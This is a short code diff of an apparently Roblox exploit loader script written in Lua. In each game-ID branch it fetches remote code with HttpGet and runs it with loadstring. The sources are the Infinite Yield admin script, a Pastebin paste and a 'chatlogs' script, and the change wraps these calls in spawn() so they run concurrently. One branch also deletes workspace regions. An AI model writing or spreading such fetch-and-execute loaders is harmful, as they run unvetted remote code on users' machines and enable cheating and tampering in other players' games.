@@ -71,25 +71,35 @@ end
 
 local gameIds = {
     ["FAILURE"] = function()
+         spawn(function()
         loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
-        loadstring(game:HttpGet("https://pastebin.com/raw/KqKxXpWh"))()        
+            end)
+                 spawn(function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/KqKxXpWh"))()   
+            end)
     end,
     ["4483381587"] = function()
         -- a literal baseplate
         changeText("interconnecting supercollision hypermatrices...")
+         spawn(function()
         loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+            end)
+                 spawn(function()
         loadstring(game:HttpGet("https://pastebin.com/raw/KqKxXpWh"))()        
-
+            end)
     end,
     ['524578448'] = function()
         changeText("purficating gyroidic oscilators...")
         workspace.Regions:Destroy()
-
+        spawn(function()
         loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+            end)
         spawn(function()
                 loadstring(game:HttpGet("https://raw.githubusercontent.com/talkinglock/chatlogs/refs/heads/main/main.lua"))()
+        end)
+        spawn(function()
+            loadstring(game:HttpGet("https://pastebin.com/raw/KqKxXpWh"))()    
             end)
-        loadstring(game:HttpGet("https://pastebin.com/raw/KqKxXpWh"))()        
     end
 }
 
